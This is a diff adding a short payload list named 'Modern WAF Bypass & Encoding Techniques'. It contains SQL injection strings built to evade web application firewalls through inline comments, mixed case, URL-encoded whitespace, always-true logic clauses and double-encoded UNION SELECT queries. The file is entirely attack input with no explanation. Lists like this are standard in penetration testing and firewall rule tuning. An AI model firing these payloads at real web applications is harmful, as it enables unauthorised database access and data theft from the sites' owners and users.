@@ -1,0 +1,22 @@
+# Modern WAF Bypass & Encoding Techniques
+
+# Inline Comments & Case
+uNiOn/**/sElEcT/**/1,2,3
+/*!50000UNION*//*!50000SELECT*/1,2,3
+%55nion%20%53elect%201,2,3
+
+# Whitespace Bypasses
+UNION+SELECT+1,2,3
+UNION%0aSELECT%0a1,2,3
+UNION%09SELECT%091,2,3
+UNION%0dSELECT%0d1,2,3
+
+# Logic Bypasses
+' OR 1=1 LIMIT 1-- -
+' OR '1'='1
+' GROUP BY 1,2,3 HAVING 1=1-- -
+' AND 1=1-- -
+
+# Double Encoding
+%2527%2520OR%25201%253D1
+%2527%2520UNION%2520SELECT%2520NULL%252C%2520NULL
